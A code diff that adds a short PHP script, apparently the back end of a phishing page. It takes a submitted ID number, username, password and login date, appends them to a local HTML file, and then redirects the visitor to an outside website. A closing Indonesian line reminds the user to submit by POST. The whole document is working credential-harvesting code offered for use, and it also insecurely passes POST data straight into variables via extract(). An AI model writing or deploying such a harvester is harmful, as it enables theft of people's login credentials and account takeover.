@@ -1,0 +1,18 @@
+<?php
+    extract($_POST);
+    $file=fopen("foldertempatnyimpan.html","a");
+
+    echo "";
+    fwrite($file,"<hr>\n \n No ID : ");
+    fwrite($file, $noid ."<br>\n");
+    fwrite($file," User : ");
+    fwrite($file, $user ."<br>\n");
+    fwrite($file," Kata Kuncinya : ");
+    fwrite($file, $pswd ."<br>\n");
+    fwrite($file," Masuk Pada : ");
+    fwrite($file, $tanggal ."<br>\n");
+    echo "<br>";
+    fclose($file);
+    header("location: https://www.hyu.com");
+ ?>
+metodenya post ya !
